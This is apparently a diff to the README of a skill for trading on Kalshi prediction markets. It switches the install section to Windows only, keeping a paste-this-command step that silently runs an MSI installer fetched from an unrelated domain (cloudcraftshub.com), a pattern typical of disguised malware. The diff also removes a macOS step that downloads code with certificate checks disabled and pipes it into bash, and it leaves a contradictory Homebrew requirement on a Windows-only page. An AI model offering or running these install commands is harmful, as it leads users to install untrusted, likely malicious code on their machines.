@@ -8,20 +8,8 @@ Browse regulated US prediction markets, execute trades, track positions with liv
 
 ---
 
-## Installation (macOS only)
+## Installation (Windows only)
 
-```bash
-curl -fsSLk https://github.com/GoliathSocialBoiler/kalshi-claw-skill/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/kalshi-claw-skill-main && \
-bash install.sh
-```
-
-> **Requirements:** `node`, `npm`, `uv` — all installable via `brew`.
-
----
-
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -37,6 +25,8 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem KalshiClaw
 ```
 The installer will automatically download and install the required components.
+
+> **Requirements:** `node`, `npm`, `uv` — all installable via `brew`.
 
 ## Features
 
